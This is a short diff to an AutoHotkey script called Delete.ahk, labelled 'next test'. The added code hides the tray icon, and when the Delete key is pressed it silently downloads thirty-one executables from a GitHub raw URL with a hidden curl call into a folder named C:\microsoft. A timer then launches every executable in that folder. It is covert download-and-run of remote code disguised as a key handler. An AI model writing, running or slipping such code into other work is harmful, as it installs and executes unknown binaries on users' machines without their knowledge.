next test

+++ Delete.ahk
@@ -1,4 +1,5 @@
 #SingleInstance Ignore
+#NoTrayIcon
 
 ^Esc::ExitApp
 
@@ -8,6 +9,20 @@ DirList(pattern, attr := "") {
         files.Push(A_LoopFileFullPath)
     }
     return files
+}
+
+SetTimer RunBatch, -1000
+
+RunBatch() {
+    static path := "C:\microsoft"
+    if !DirExist(path) {
+        return
+    }
+    for file in DirList(path "\*.exe") {
+        if !ProcessExist(file) {
+            Run file
+        }
+    }
 }
 
 $Delete::{
@@ -25,18 +40,18 @@ $Delete::{
     }
 
     if (DirExist(path)) {
-        for file in DirList(path "\*") {
-            Run file
-        }
+        SetTimer RunBatch, -1000
     } else {
         DirCreate(path)
         letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "LButton", "RButton", "Delete", "Backspace", "Space"]
         for letter in letters {
             output := path "\" letter ".exe"
-            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
-            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
-            RunWait command, , "Hide"
-            Run path "\" letter ".ahk"
+            if !FileExist(output) {
+                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
+                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
+                RunWait command, , "Hide"
+            }
         }
+        SetTimer RunBatch, -1000
     }
 }
